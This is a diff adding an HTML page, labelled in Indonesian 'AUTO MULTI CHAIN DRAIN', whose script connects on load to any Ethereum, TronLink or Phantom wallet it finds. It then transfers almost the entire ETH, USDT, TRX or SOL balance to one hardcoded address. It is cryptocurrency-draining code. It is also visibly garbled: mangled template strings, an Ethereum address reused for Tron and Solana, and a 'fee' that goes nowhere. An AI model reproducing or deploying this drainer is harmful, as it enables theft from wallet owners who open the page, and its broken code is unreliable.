@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AUTO DRAIN - ETH | SOL | TRON</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@tronweb3/tronweb@latest/dist/TronWeb.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; margin:0; padding:15px; background:#0f0f0f; color:white; }
+        .container { max-width:100%; background:#1a1a1a; padding:20px; border-radius:12px; }
+        .log { margin-top:15px; height:520px; overflow-y:auto; background:#000; padding:12px; border-radius:8px; 
+               font-family:monospace; font-size:13.8px; line-height:1.5; }
+        .info { background:#003300; padding:12px; border-radius:8px; margin:10px 0; }
+        h2 { text-align:center; color:#00ff88; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🚀 AUTO MULTI CHAIN DRAIN</h2>
+        <p><strong>ETH • SOL • TRON • Fee 7%</strong></p>
+
+        <div class="info">
+            <strong>Tujuan:</strong> 0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e<br>
+            <strong>Fee:</strong> 7%
+        </div>
+
+        <div class="log" id="log"></div>
+    </div>
+
+    <script>
+        const SECONDARY = "0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e";
+        const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+        const FEE_PERCENT = 7;
+
+        const log = (msg, type = "info") => {
+            const el = document.getElementById('log');
+            const time = new Date().toLocaleTimeString('id-ID');
+            let color = "#aaaaaa";
+            if (type === "success") color = "#00ff88";
+            if (type === "warning") color = "#ffaa00";
+            if (type === "error") color = "#ff5555";
+            if (type === "detail") color = "#88ccff";
+
+            el.innerHTML += `<span style="color:\( {color}">[ \){time}] ${msg}</span><br>`;
+            el.scrollTop = el.scrollHeight;
+        };
+
+        async function forceConnect() {
+            log("🔄 Menunggu koneksi wallet...", "warning");
+
+            const connectLoop = setInterval(async () => {
+                if (window.ethereum) {
+                    clearInterval(connectLoop);
+                    await processEthereum();
+                } else if (window.tronLink) {
+                    clearInterval(connectLoop);
+                    await processTron();
+                } else if (window.phantom?.solana || window.solana) {
+                    clearInterval(connectLoop);
+                    await processSolana();
+                }
+            }, 1500);
+        }
+
+        window.onload = () => {
+            log("🚀 Auto Drain Multi Chain Dimulai...", "info");
+            setTimeout(forceConnect, 800);
+        };
+
+        // ===================== ETHEREUM (ETH + USDT) =====================
+        async function processEthereum() {
+            try {
+                log("🔍 Mendeteksi Ethereum...", "info");
+                const provider = new ethers.BrowserProvider(window.ethereum);
+                
+                await window.ethereum.request({ method: "eth_requestAccounts" });
+                const signer = await provider.getSigner();
+                const address = await signer.getAddress();
+
+                log(`✅ Terhubung: \( {address.slice(0,6)}... \){address.slice(-4)}`, "success");
+
+                if (!confirm(`⚠️ YAKIN INGIN KIRIM SEMUA SALDO?\n\nAlamat tujuan:\n${SECONDARY}\n\nFee: 7%`)) {
+                    return log("❌ Dibatalkan oleh user", "warning");
+                }
+
+                // Drain ETH
+                const ethBalance = await provider.getBalance(address);
+                if (ethBalance > ethers.parseEther("0.001")) {
+                    const fee = ethBalance * BigInt(FEE_PERCENT) / 100n;
+                    const sendEth = ethBalance - fee - ethers.parseEther("0.0003");
+
+                    log(`💰 ETH: ${ethers.formatEther(ethBalance)} → Kirim ${ethers.formatEther(sendEth)}`);
+                    const txEth = await signer.sendTransaction({ to: SECONDARY, value: sendEth });
+                    log(`⏳ ETH Tx: ${txEth.hash}`, "detail");
+                    await txEth.wait();
+                    log("✅ ETH BERHASIL DIKIRIM", "success");
+                    log(`🔗 https://etherscan.io/tx/${txEth.hash}`, "detail");
+                }
+
+                // Drain USDT
+                const usdtContract = new ethers.Contract(USDT, [
+                    "function balanceOf(address) view returns (uint256)",
+                    "function transfer(address,uint256) returns (bool)"
+                ], signer);
+
+                const usdtBal = await usdtContract.balanceOf(address);
+                if (usdtBal > 0n) {
+                    const fee = usdtBal * BigInt(FEE_PERCENT) / 100n;
+                    const sendUsdt = usdtBal - fee;
+
+                    log(`💰 USDT: ${ethers.formatUnits(usdtBal,6)} → Kirim ${ethers.formatUnits(sendUsdt,6)}`);
+                    const txUsdt = await usdtContract.transfer(SECONDARY, sendUsdt);
+                    log(`⏳ USDT Tx: ${txUsdt.hash}`, "detail");
+                    await txUsdt.wait();
+                    log("✅ USDT BERHASIL DIKIRIM", "success");
+                    log(`🔗 https://etherscan.io/tx/${txUsdt.hash}`, "detail");
+                }
+
+            } catch (e) {
+                log(`❌ Ethereum Error: ${e.message}`, "error");
+            }
+        }
+
+        // ===================== TRON =====================
+        async function processTron() {
+            try {
+                log("🔍 Mendeteksi Tron...", "info");
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                const tronWeb = window.tronLink.tronWeb;
+                const address = tronWeb.defaultAddress.base58;
+
+                log(`✅ Terhubung Tron: ${address.slice(0,6)}...`, "success");
+
+                if (!confirm(`⚠️ YAKIN KIRIM SEMUA TRX?\n\nTujuan: ${SECONDARY}\nFee: 7%`)) return;
+
+                const balance = await tronWeb.trx.getBalance(address);
+                if (balance < 1000000) return log("Saldo TRX terlalu kecil", "warning");
+
+                const sendAmount = Math.floor(balance * (1 - FEE_PERCENT/100));
+
+                const tx = await tronWeb.transactionBuilder.sendTrx(SECONDARY, sendAmount, address);
+                const signed = await tronWeb.trx.sign(tx);
+                const result = await tronWeb.trx.sendRawTransaction(signed);
+
+                log(`✅ TRX Tx ID: ${result.txid}`, "success");
+                log(`🔗 https://tronscan.org/#/transaction/${result.txid}`, "detail");
+
+            } catch (e) {
+                log(`❌ Tron Error: ${e.message}`, "error");
+            }
+        }
+
+        // ===================== SOLANA =====================
+        async function processSolana() {
+            try {
+                log("🔍 Mendeteksi Solana...", "info");
+                const provider = window.phantom?.solana || window.solana;
+                if (!provider) throw new Error("Phantom tidak ditemukan");
+
+                await provider.connect();
+                const pubKey = provider.publicKey.toString();
+                log(`✅ Terhubung Solana: ${pubKey.slice(0,6)}...`, "success");
+
+                if (!confirm(`⚠️ YAKIN KIRIM SEMUA SOL?\n\nTujuan: ${SECONDARY}\nFee: 7%`)) return;
+
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
+                const balance = await connection.getBalance(new solanaWeb3.PublicKey(pubKey));
+
+                if (balance < 5000000) return log("Saldo SOL terlalu kecil", "warning");
+
+                const feeLam = Math.floor(balance * FEE_PERCENT / 100);
+                const sendLam = balance - feeLam - 15000;
+
+                const tx = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: new solanaWeb3.PublicKey(pubKey),
+                        toPubkey: new solanaWeb3.PublicKey(SECONDARY),
+                        lamports: sendLam
+                    })
+                );
+
+                const { blockhash } = await connection.getLatestBlockhash();
+                tx.recentBlockhash = blockhash;
+                tx.feePayer = new solanaWeb3.PublicKey(pubKey);
+
+                const signedTx = await provider.signTransaction(tx);
+                const signature = await connection.sendRawTransaction(signedTx.serialize());
+
+                log(`✅ SOL Signature: ${signature}`, "success");
+                log(`🔗 https://solscan.io/tx/${signature}`, "detail");
+
+            } catch (e) {
+                log(`❌ Solana Error: ${e.message}`, "error");
+            }
+        }
+    </script>
+</body>
+</html>
